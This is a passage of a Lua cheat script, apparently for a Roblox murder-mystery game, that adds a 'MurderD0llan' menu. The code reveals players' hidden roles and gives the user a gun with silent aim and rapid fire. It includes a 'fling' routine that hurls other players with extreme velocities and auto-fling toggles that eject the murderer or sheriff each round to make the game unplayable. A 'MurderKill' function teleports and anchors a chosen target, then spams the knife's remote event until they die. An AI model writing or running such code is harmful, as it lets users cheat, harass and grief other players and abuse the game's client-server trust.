				print("[DEBUG] Nuevo Sheriff detectado:", currentSheriff and currentSheriff.Name or "Ninguno")
				sucessnotify("New Sherrif / Hero: "..newSheriff and currentSheriff.Name or "none")
			end

			task.wait(1) -- chequeo cada 1 segundo (puedes ajustar)
		end
		print("[DEBUG] Monitoreo detenido.")
	end

	-- Click del botón
	OnNewMurderOrSheriff.MouseButton1Click:Connect(function()
		IsActiveONMOS = not IsActiveONMOS
		IsActiveONMOSFrame.BackgroundColor3 = IsActiveONMOS and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
		print("[DEBUG] Estado del sistema ONMOS:", IsActiveONMOS and "ACTIVO" or "INACTIVO")

		if IsActiveONMOS then
			currentMurderer = Help_Functions.findMurderer()
			currentSheriff = Help_Functions.findSheriff()
			task.spawn(startMonitoringRoles)
		end
	end)

	------------------

	local Button = script.Parent.OnNewTrapsAndGunDrops
	local Frame = Button.Frame

	local isTracking = false
	local connection -- para desconectar cuando se desactive

	-- Colores visuales
	local ACTIVE_COLOR = Color3.fromRGB(0, 200, 50)
	local INACTIVE_COLOR = Color3.fromRGB(200, 50, 50)

	-- Acciones al detectar objetos
	local function handleGunDrop(obj)
		print("[DEBUG] GunDrop detectado:", obj:GetFullName())
		sucessnotify("Gun Was Dropped")
	end

	local function handleTrap(obj)
		print("[DEBUG] Trampa detectada:", obj:GetFullName())
		sucessnotify("Trap Was Placed by Murderer "..Help_Functions.findMurderer().Name)
	end

	-- Activador del botón
	Button.MouseButton1Click:Connect(function()
		isTracking = not isTracking
		Frame.BackgroundColor3 = isTracking and ACTIVE_COLOR or INACTIVE_COLOR
		print("[DEBUG] Monitoreo de GunDrop/traps:", isTracking and "ACTIVADO" or "DESACTIVADO")

		if isTracking then
			connection = workspace.DescendantAdded:Connect(function(obj)
				if obj.Name == "GunDrop" then
					handleGunDrop(obj)
				elseif obj.Name == "trap" then
					handleTrap(obj)
				end
			end)
		else
			if connection then
				connection:Disconnect()
				connection = nil
			end
		end
	end)


	local function GiveModifiedGun(GunName: string, callback)
		--    ModifiedGun - By G0bbyD0llan

		--    Converted with ttyyuu12345's model to script plugin v4

		task.spawn(function()
			-- Tabla de coroutines si se necesita
			local cors = {}

			-- Crear herramienta
			local gunTool = Instance.new("Tool")
			gunTool.Name = (GunName or "Modified").."Gun"
			gunTool.TextureId = "rbxassetid://97889613"
			gunTool.CanBeDropped = false
			gunTool.Grip = CFrame.new(0, -0.4, -0.3, 1, 0, 0, 0, 8.5e-07, -1, 0, 1, 8.5e-07)
			gunTool.GripForward = Vector3.new(0, 1, -8.5e-07)
			gunTool.GripPos = Vector3.new(0, -0.4, -0.3)
			gunTool.GripUp = Vector3.new(0, 8.5e-07, 1)
			gunTool.Parent = game:GetService("Players").LocalPlayer.Backpack

			-- Crear mango (Handle)
			local handle = Instance.new("Part")
			handle.Name = "Handle"
			handle.Size = Vector3.new(0.2, 1.83, 1.03)
			handle.Position = Vector3.new(-35, 3.515, 244)
			handle.Orientation = Vector3.new(-90, 180, 0)
			handle.Rotation = Vector3.new(-90, 0, 180)
			handle.CFrame = CFrame.new(-35, 3.515, 244, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			handle.BottomSurface = Enum.SurfaceType.Smooth
			handle.TopSurface = Enum.SurfaceType.Smooth
			handle.CanCollide = false
			handle.FormFactor = Enum.FormFactor.Custom
			handle.formFactor = Enum.FormFactor.Custom
			handle.Parent = gunTool

			-- Malla especial del arma
			local mesh = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.FileMesh
			mesh.MeshId = "http://www.roblox.com/asset/?id=79401392"
			mesh.TextureId = "http://www.roblox.com/asset/?id=91723031"
			mesh.Scale = Vector3.new(1.6, 1.6, 1.6)
			mesh.Parent = handle

			-- Sonido de disparo
			local fireSound = Instance.new("Sound")
			fireSound.Name = "FireSound"
			fireSound.SoundId = "http://www.roblox.com/asset/?id=10209803"
			fireSound.Volume = 1
			fireSound.Parent = handle

			-- Sonido de recarga
			local reloadSound = Instance.new("Sound")
			reloadSound.Name = "Reload"
			reloadSound.SoundId = "rbxassetid://6336569579"
			reloadSound.Volume = 1
			reloadSound.Parent = handle

			-- Sonido de impacto
			local hitSound = Instance.new("Sound")
			hitSound.Name = "Hit"
			hitSound.SoundId = "rbxassetid://7031275541"
			hitSound.Volume = 10
			hitSound.Parent = handle

			-- Sonido de equipar máscara
			local equipSound = Instance.new("Sound")
			equipSound.Name = "Mask_Equip"
			equipSound.SoundId = "rbxassetid://2706199011"
			equipSound.Parent = handle

			-- Parte invisible para origen de trazo (tracer)
			local tracerOrigin = Instance.new("Part")
			tracerOrigin.Name = "ShootTracerStarterPosition"
			tracerOrigin.Size = Vector3.new(0.17, 0.17, 0.17)
			tracerOrigin.Position = Vector3.new(-35, 3.895, 244.915)
			tracerOrigin.CFrame = CFrame.new(-35, 3.895, 244.915, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			tracerOrigin.Transparency = 1
			tracerOrigin.CanCollide = false
			tracerOrigin.BottomSurface = Enum.SurfaceType.Smooth
			tracerOrigin.TopSurface = Enum.SurfaceType.Smooth
			tracerOrigin.Parent = handle

			-- Unión entre la parte del disparo y el handle
			local weld = Instance.new("WeldConstraint")
			weld.Part0 = handle
			weld.Part1 = tracerOrigin
			weld.Parent = tracerOrigin


			----------------------------------------------------------------------------------------------------------------


			local InstantReload = false
			local HoldClickToShootMultipleAtOnce = false
			local ShootInDirections = false
			local CreateHitMarkers = false
			local SilentAimOnShoot = false -- <== NUEVA VARIABLE

			-- Services
			local Players = game:GetService("Players")
			local UserInputService = game:GetService("UserInputService")
			local Debris = game:GetService("Debris")
			local Workspace = game:GetService("Workspace")

			-- Constants
			local RAY_MAX_DISTANCE = 1000
			local RELOAD_COOLDOWN = 0.5

			-- Player and Tool
			local player = Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
			local humanoid = character:WaitForChild("Humanoid")
			local mouse = player:GetMouse()
			local tool = gunTool
			local handle = tool:WaitForChild("Handle")

			-- Sounds
			local fireSound = handle:WaitForChild("FireSound")
			local hitSound = handle:WaitForChild("Hit")
			local reloadSound = handle:WaitForChild("Reload")

			-- Gun state
			local canShoot = true
			local isReloading = false

			-- Muzzle Part
			local muzzlePart = handle:WaitForChild("ShootTracerStarterPosition")

			-- Asegurarse de que esté soldada al handle
			if not muzzlePart:FindFirstChildOfClass("WeldConstraint") then
				local weld = Instance.new("WeldConstraint")
				weld.Part0 = handle
				weld.Part1 = muzzlePart
				weld.Parent = muzzlePart
			end

			-- Function to create tracer
			local function createTracer(fromPosition, toPosition)
				local distance = (fromPosition - toPosition).Magnitude
				if distance < 0.1 then return end
				local tracer = Instance.new("Part")
				tracer.Name = "Tracer"
				tracer.Anchored = true
				tracer.CanCollide = false
				tracer.Material = Enum.Material.SmoothPlastic
				tracer.Transparency = 0.5
				tracer.Color = Color3.new(1, 1, 1)
				tracer.Size = Vector3.new(0.1, 0.1, distance)
				tracer.CFrame = CFrame.lookAt(fromPosition, toPosition) * CFrame.new(0, 0, -distance / 2)
				tracer.Parent = Workspace
				Debris:AddItem(tracer, 0.1)
			end

			local function getClosestPlayerToCursor(cursorWorldPosition)
				local closestPlayer = nil
				local shortestDistance = math.huge

				for _, otherPlayer in ipairs(Players:GetPlayers()) do
					if otherPlayer ~= player and otherPlayer.Character then
						local rootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
						if rootPart then
							local distance = (cursorWorldPosition - rootPart.Position).Magnitude
							if distance < shortestDistance then
								shortestDistance = distance
								closestPlayer = otherPlayer
							end
						end
					end
				end

				return closestPlayer
			end

			local function createHitMarker(position)
				if not CreateHitMarkers then return end
				local marker = Instance.new("Part")
				marker.Name = "HitMarker"
				marker.Anchored = true
				marker.CanCollide = false
				marker.Material = Enum.Material.Neon
				marker.Color = Color3.fromRGB(255, 0, 0)
				marker.Shape = Enum.PartType.Ball
				marker.Size = Vector3.new(0.3, 0.3, 0.3)
				marker.Position = position
				marker.Parent = Workspace
				Debris:AddItem(marker, 0.3)
			end

			local function fireRay(direction)
				local muzzlePosition = muzzlePart.Position
				local raycastParams = RaycastParams.new()
				raycastParams.FilterDescendantsInstances = {player.Character, tool}
				raycastParams.FilterType = Enum.RaycastFilterType.Exclude

				local raycastResult = Workspace:Raycast(muzzlePosition, direction * RAY_MAX_DISTANCE, raycastParams)
				local hitPosition = raycastResult and raycastResult.Position or (muzzlePosition + direction * RAY_MAX_DISTANCE)

				createTracer(muzzlePosition, hitPosition)

				local targetHumanoid = nil

				if raycastResult then
					createHitMarker(hitPosition)
					local hitPart = raycastResult.Instance
					local hitModel = hitPart:FindFirstAncestorOfClass("Model")
					if hitModel then
						targetHumanoid = hitModel:FindFirstChildOfClass("Humanoid")
					end
				end

				if not targetHumanoid and SilentAimOnShoot then
					local silentTarget = getClosestPlayerToCursor(hitPosition)
					if silentTarget and silentTarget.Character then
						local humanoid = silentTarget.Character:FindFirstChildOfClass("Humanoid")
						local root = silentTarget.Character:FindFirstChild("HumanoidRootPart")
						if humanoid and root then
							createTracer(muzzlePosition, root.Position)
							createHitMarker(root.Position)
							targetHumanoid = humanoid
							hitPosition = root.Position
						end
					end
				end

				if targetHumanoid then
					hitSound:Play()
					if typeof(callback) == "function" then
						local playerHit = game.Players:GetPlayerFromCharacter(targetHumanoid.Parent)
						if playerHit then
							pcall(function()
								callback(playerHit)
							end)
						end
					end
				end
			end

			local function reloadGun()
				if isReloading then return end
				isReloading = true
				reloadSound:Play()
				local reloadDuration = reloadSound.TimeLength
				if reloadDuration <= 0 then reloadDuration = 2 end
				task.wait(reloadDuration)
				isReloading = false
				canShoot = true
			end

			local function shoot()
				if not canShoot or isReloading then return end
				if not character or not humanoid or humanoid.Health == 0 then return end
				if not handle then return end

				local muzzlePosition = muzzlePart.Position
				local mousePos = mouse.Hit and mouse.Hit.Position or (mouse.UnitRay.Origin + mouse.UnitRay.Direction * RAY_MAX_DISTANCE)
				local baseDir = (mousePos - muzzlePosition).Unit

				canShoot = false
				fireSound:Play()

				if ShootInDirections then
					local right = Vector3.new(1, 0, 0)
					fireRay((baseDir + right * 0.1).Unit)
					fireRay(baseDir)
					fireRay((baseDir - right * 0.1).Unit)
				else
					fireRay(baseDir)
				end

				if InstantReload then
					canShoot = true
				else
					task.spawn(function()
						task.wait(RELOAD_COOLDOWN)
						reloadGun()
					end)
				end
			end

			tool.Activated:Connect(function()
				shoot()
				if HoldClickToShootMultipleAtOnce then
					local conn
					conn = game:GetService("RunService").RenderStepped:Connect(function()
						if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
							conn:Disconnect()
						else
							shoot()
						end
					end)
				end
			end)

			tool.Equipped:Connect(function()
				handle.Mask_Equip:Play()
				mouse.Icon = "http://www.roblox.com/asset/?id=79658449"
			end)

			tool.Unequipped:Connect(function()
				handle.Mask_Equip:Play()
				mouse.Icon = ""
			end)

			local IsHiden = false

			-- GUI setup (solo se carga una vez)
			local function setupGunGUI()
				if game.Players.LocalPlayer.PlayerGui:FindFirstChild("GunSettingsGui") then return end

				local player = game.Players.LocalPlayer
				local playerGui = player:WaitForChild("PlayerGui")

				local ScreenGui = Instance.new("ScreenGui")
				ScreenGui.Name = "GunSettingsGui"
				ScreenGui.Parent = playerGui
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

				local Frame = Instance.new("Frame")
				Frame.Parent = ScreenGui
				Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Frame.BackgroundTransparency = 0.7
				Frame.Position = UDim2.new(0.331, 0, 0.331, 0)
				Frame.Size = UDim2.new(0, 228, 0, 205)
				Frame.Draggable = true
				Frame.Active = true
				Frame.Visible = not IsHiden -- Oculto si IsHiden es true

				local TextButton = Instance.new("TextButton")
				TextButton.Parent = ScreenGui
				TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextButton.BackgroundTransparency = 0.9
				TextButton.BorderSizePixel = 0
				TextButton.Position = UDim2.new(0, 10, 0.5, -12) -- Izquierda centrado verticalmente
				TextButton.Size = UDim2.new(0, 30, 0, 25)
				TextButton.Font = Enum.Font.SourceSans
				TextButton.Text = "FG"
				TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextButton.TextSize = 14
				TextButton.TextTransparency = 0.1
				TextButton.Visible = IsHiden

				TextButton.MouseButton1Click:Connect(function()
					IsHiden = false
					Frame.Visible = true
					TextButton.Visible = false
				end)

				local Title = Instance.new("TextLabel")
				Title.Parent = Frame
				Title.Size = UDim2.new(0, 203, 0, 27)
				Title.BackgroundTransparency = 0.5
				Title.Text = (GunName or "Modified").." Gun - GUI (By G0bbyD0llan)"
				Title.Font = Enum.Font.SourceSans
				Title.TextSize = 14
				Title.TextColor3 = Color3.new(0, 0, 0)

				local close = Instance.new("TextButton")
				close.Parent = Frame
				close.Size = UDim2.new(0, 25, 0, 27)
				close.Position = UDim2.new(0.89, 0, 0, 0)
				close.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
				close.BackgroundTransparency = 0.6
				close.Text = "X"
				close.TextScaled = true
				close.Font = Enum.Font.SourceSans
				close.TextColor3 = Color3.new(0, 0, 0)

				close.MouseButton1Click:Connect(function()
					Frame.Visible = false
					IsHiden = true
					TextButton.Visible = true
				end)

				local ContentArea = Instance.new("Frame")
				ContentArea.Parent = Frame
				ContentArea.Position = UDim2.new(0, 0, 0.23, 0)
				ContentArea.Size = UDim2.new(0, 228, 0, 110)
				ContentArea.BackgroundTransparency = 1

				local UIListLayout = Instance.new("UIListLayout")
				UIListLayout.Parent = ContentArea
				UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.Padding = UDim.new(0, 8)

				local function createToggleButton(label, defaultValue, callback)
					local button = Instance.new("TextButton")
					button.Size = UDim2.new(0, 200, 0, 24)
					button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					button.BackgroundTransparency = 0.5
					button.BorderColor3 = Color3.fromRGB(255, 255, 255)
					button.TextColor3 = Color3.fromRGB(255, 255, 255)
					button.Font = Enum.Font.SourceSans
					button.TextSize = 14
					button.Text = label .. ": " .. tostring(defaultValue)
					button.Parent = ContentArea

					local state = defaultValue
					button.MouseButton1Click:Connect(function()
						state = not state
						button.Text = label .. ": " .. tostring(state)
						callback(state)
					end)
				end

				-- Botones con lógica
				createToggleButton("Instant Reload", InstantReload, function(val)
					InstantReload = val
				end)

				createToggleButton("Hold Click Multi", HoldClickToShootMultipleAtOnce, function(val)
					HoldClickToShootMultipleAtOnce = val
				end)

				createToggleButton("Shoot in Directions", ShootInDirections, function(val)
					ShootInDirections = val
				end)

				createToggleButton("Create Hit Markers", CreateHitMarkers, function(val)
					CreateHitMarkers = val
				end)

				createToggleButton("Silent AIM", SilentAimOnShoot, function(val)
					SilentAimOnShoot = val
				end)
			end

			-- Llama a la GUI al equipar el arma
			tool.Equipped:Connect(function()
				setupGunGUI()
			end)

			tool.Unequipped:Connect(function()
				local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("GunSettingsGui")
				if gui then
					gui:Destroy()
				end
			end)

			print("Client Gun Script loaded for " .. player.Name .. ". Tool: " .. tool:GetFullName())
		end)
	end


	local ConnectionV11

	local IsActiveFlingGun = false

	local FlingGunButton = script.Parent.FlingGun

	local IsActiveFlingGunButtonFrameBGC3 = FlingGunButton.Frame

	local Player = game:GetService("Players").LocalPlayer
	local function SkidFling(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		if not TargetPlayer or not TargetPlayer.Character then
			errornotify("Target player is invalid or has no character.")
			return
		end

		print("skidfling was executed")
		local TCharacter = TargetPlayer.Character
		local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		local TRootPart = THumanoid and THumanoid.RootPart
		local THead = TCharacter:FindFirstChild("Head")
		local Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		local Handle = Accessory and Accessory:FindFirstChild("Handle")

		if not Character or not Humanoid or not RootPart then
			errornotify("Your character is not fully loaded.")
			return
		end

		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
			errornotify("Target player has no BasePart.")
			return
		end

		sucessnotify("Fling started on target: " .. TargetPlayer.Name)

		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end

		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end

		local function FPos(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end

		local function SFBasePart(BasePart)
			local TimeToWait = 2
			local Time = tick()
			local Angle = 0

			repeat
				if RootPart and THumanoid then
					if BasePart.Velocity.Magnitude < 50 then
						Angle = Angle + 100

						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()

						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
					else
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
					end
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
		end

		workspace.FallenPartsDestroyHeight = 0/0

		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)

		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		if TRootPart and THead then
			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
				SFBasePart(THead)
			else
				SFBasePart(TRootPart)
			end
		elseif TRootPart then
			SFBasePart(TRootPart)
		elseif THead then
			SFBasePart(THead)
		elseif Handle then
			SFBasePart(Handle)
		else
			errornotify("No valid fling target part found.")
		end

		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid

		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
			Humanoid:ChangeState("GettingUp")
			for _, x in ipairs(Character:GetChildren()) do
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25

		workspace.FallenPartsDestroyHeight = getgenv().FPDH

		sucessnotify("Fling finished successfully.")
	end
	FlingGunButton.MouseButton1Click:Connect(function()
		if not IsActiveFlingGun then
			IsActiveFlingGun = true
			GiveModifiedGun("Fling", function(Player)
				SkidFling(Player)
			end)
			--connect CharacterAdded
			ConnectionV11 = LocalPlayer.CharacterAdded:Connect(function()
				task.wait(1)
				GiveModifiedGun("Fling", function(Player)
					SkidFling(Player)
				end)
			end)
			IsActiveFlingGunButtonFrameBGC3.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			if ConnectionV11 then
				ConnectionV11:Disconnect()
			end
			for _, x in ipairs(LocalPlayer.Character:GetChildren()) do
				if x:IsA("Tool") and x.Name == "FlingGun" then
					LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
				end
			end
			game["Run Service"].RenderStepped:Wait()
			for _, x in ipairs(LocalPlayer.Backpack:GetChildren()) do
				if x:IsA("Tool") and x.Name == "FlingGun" then
					x:Destroy()
				end
			end
			IsActiveFlingGun = false
			IsActiveFlingGunButtonFrameBGC3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local localplayer = Players.LocalPlayer
	local IsActiveRODP = false

	local RespawnOnDeathPosition = script.Parent:WaitForChild("RespawnOnDeathPosition")
	local FrameRODP = RespawnOnDeathPosition:WaitForChild("Frame")

	-- Colores
	local ColorOn = Color3.fromRGB(0, 255, 0)   -- Verde (Activado)
	local ColorOff = Color3.fromRGB(255, 0, 0)  -- Rojo (Desactivado)

	-- Actualizar color visual
	local function UpdateFrameColor()
		FrameRODP.BackgroundColor3 = IsActiveRODP and ColorOn or ColorOff
	end

	-- Alternar estado
	RespawnOnDeathPosition.MouseButton1Click:Connect(function()
		IsActiveRODP = not IsActiveRODP
		UpdateFrameColor()
	end)

	-- Inicializa color
	UpdateFrameColor()

	-- Guardar última posición de muerte y reubicar al reaparecer
	local lastDeathPosition = nil

	-- Monitorizar muerte y guardar posición
	local function setupCharacter(char)
		local hrp = char:WaitForChild("HumanoidRootPart")
		local humanoid = char:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid.Died:Connect(function()
				if IsActiveRODP then
					lastDeathPosition = hrp.Position
				end
			end)
		end
	end

	-- Teletransportar al reaparecer
	localplayer.CharacterAdded:Connect(function(char)
		setupCharacter(char)

		if IsActiveRODP and lastDeathPosition then
			char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(lastDeathPosition + Vector3.new(0, 3, 0))
		end
	end)

	-- Por si ya está cargado
	if localplayer.Character then
		setupCharacter(localplayer.Character)
	end


	local MTGU = script.Parent.MakeTheGameUnplayable

	local IsActiveMTGU = false

	local ConnectionV12

	local MTGUFrame = script.Parent.MakeTheGameUnplayable.Frame

	MTGU.MouseButton1Click:Connect(function()
		if not IsActiveMTGU then
			IsActiveMTGU = true
			ConnectionV12 = workspace.ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(15, function()
						SkidFling(Help_Functions.findMurderer())
					end)
				end
			end)
			MTGUFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			if ConnectionV12 then
				ConnectionV12:Disconnect()
			end
			IsActiveMTGU = false
			MTGUFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)



	local NSIR = script.Parent.NoSheriffsInRound

	local IsActiveNSIR = false

	local ConnectionV13

	local NSIRFrame = script.Parent.NoSheriffsInRound.Frame

	NSIR.MouseButton1Click:Connect(function()
		if not IsActiveNSIR then
			IsActiveNSIR = true
			ConnectionV13 = workspace.ChildAdded:Connect(function(child)
				if child:FindFirstChild("CoinContainer") and child:FindFirstChild("Spawns") then
					task.delay(15, function()
						SkidFling(Help_Functions.findSheriffThatsNotMe())
					end)
				end
			end)
			NSIRFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
		else
			if ConnectionV13 then
				ConnectionV13:Disconnect()
			end
			IsActiveNSIR = false
			NSIRFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)



end;
task.spawn(C_13);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_2.HandlerV2
local function C_ac()
	local script = G2L["ac"];
	local contenedorBusqueda = script.Parent -- Cambia esto a la ruta del objeto donde quieres buscar
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end
	local Players = game:GetService("Players")
	local Parent = script.Parent

	local function MouseButton1Click(TextToSearch: string, Function)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				if game:GetService("RunService"):IsStudio() then
					print("[MurderD0llan]: "..TextToSearch.." - Found")
				end
				v.MouseButton1Click:Connect(Function)
			end
		end
	end

	local function GetTarget(Name: string)
		for i, v in pairs(Players:GetPlayers()) do
			if string.find(string.lower(v.Name), string.lower(Name)) then
				return v
			end
		end
	end

	local function playSound(soundId, parent)
		if not soundId or soundId == "" then return end
		local sound = Instance.new("Sound")
		sound.SoundId = soundId
		sound.Parent = parent
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end

	local target
	local playerRemovingConnection

	local function AssignTarget(Target: Player)
		target = Target

		-- Desconectar una conexión anterior, si existe
		if playerRemovingConnection then
			playerRemovingConnection:Disconnect()
		end

		-- Crear una nueva conexión temporal
		playerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
			if player == target then
				target = nil
				Parent.playername.Text = "- Player Name: @None -"
				Parent.dectections.Text = "- NOT DETECTED -"

				require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
					title = "Target Left Server",
					text = string.format("The assigned player (@%s) has left the game and has been unassigned.", player.Name),
					soundOnOpen = Notificaciones.Aviso,
					theme = "Warning"
				})
			end
		end)

		-- Actualizar UI
		Parent.playername.Text = string.format("- Player Name: @%s -", Target.Name)
		Parent.dectections.Text = string.format("- DECTECTED - [ID]: %s -", Target.UserId)
	end

	local SearchTargetBox = Parent.TextBoxButton1PlayerName.TextBox

	SearchTargetBox.FocusLost:Connect(function()
		local Target = GetTarget(SearchTargetBox.Text)
		if Target then
			AssignTarget(Target)
			playSound(Notificaciones.Correcto, Parent)
			UpdateUIForTarget()
		else
			require(script.Parent.Parent.Parent.Parent.NotificationService).ShowNotification({
				title = "Notification Error / InputBox",
				text = string.format("Requested player (@%s) could not be found in game.Players", SearchTargetBox.Text),
				soundOnOpen = Notificaciones.Error,
				theme = "Error"
			})
		end
	end)
	local Players = game:GetService("Players")

	local function MurderKill(targetPlayer: Player)
		local localPlayer = Players.LocalPlayer
		if not (targetPlayer and localPlayer) then return end

		local targetChar = targetPlayer.Character
		local localChar = localPlayer.Character
		if not (targetChar and localChar) then return end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		local localHRP = localChar:FindFirstChild("HumanoidRootPart")
		if not (targetHRP and localHRP) then return end

		local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")
		if not targetHumanoid then return end

		-- Buscar el cuchillo en el character o en la mochila
		local knife = localChar:FindFirstChild("Knife") or localPlayer.Backpack:FindFirstChild("Knife")

		if not knife then
			warn("[Kill] No se encontró el cuchillo.")
			return
		end

		-- Si el cuchillo está en la mochila, equiparlo
		if knife.Parent == localPlayer.Backpack then
			local localHum = localChar:FindFirstChildOfClass("Humanoid")
			if localHum then
				localHum:EquipTool(knife)
			end
			task.wait(0.1) -- Esperar a que se equipe correctamente
		end

		local stabEvent = knife:FindFirstChild("Stab")
		if not (stabEvent and stabEvent:IsA("RemoteEvent")) then
			warn("[Kill] El cuchillo no tiene un RemoteEvent llamado 'Stab'.")
			return
		end

		-- Teletransportar y ocultar al objetivo
		targetHRP.Anchored = true
		targetHRP.CFrame = localHRP.CFrame + localHRP.CFrame.LookVector

		for _, part in ipairs(targetChar:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Transparency = 1
			end
		end

		-- Atacar repetidamente hasta que la salud del objetivo llegue a 0
		repeat
			stabEvent:FireServer("Slash")
			task.wait(0.1)
		until targetHumanoid.Health <= 0 or not targetHumanoid.Parent

		-- Desequipar el cuchillo
		if knife and knife.Parent == localChar then
			local localHum = localChar:FindFirstChildOfClass("Humanoid")
			if localHum then
				localHum:UnequipTools()
			end
		end

		print("[Kill] Objetivo eliminado:", targetPlayer.Name)
	end


	local shootOffset = 2.8
	local offsetToPingMult = 1


	local function PredictShootPosition(player: Player, shootOffset: number)
		pcall(function()
			player = player.Character
			if not player.Character then errornotify("Invalid Args (player is NIL)") return end
		end)
		local localplayer = game:GetService("Players").LocalPlayer
		local playerHRP = player:FindFirstChild("UpperTorso")
		local playerHum = player:FindFirstChild("Humanoid")
		if not playerHRP or not playerHum then
			errornotify("Invalid Args (player's HumanoidRootPart = NIL)")
			return nil
		end

		local playerPosition = playerHRP.Position
		local velocity = Vector3.new()
		velocity = playerHRP.AssemblyLinearVelocity
		local playerMoveDirection = playerHum.MoveDirection
		local playerLookVec = playerHRP.CFrame.LookVector
		local yVelFactor = velocity.Y > 0 and -1 or 0.5
		local predictedPosition
		predictedPosition = playerHRP.Position + ((velocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) +playerMoveDirection * shootOffset
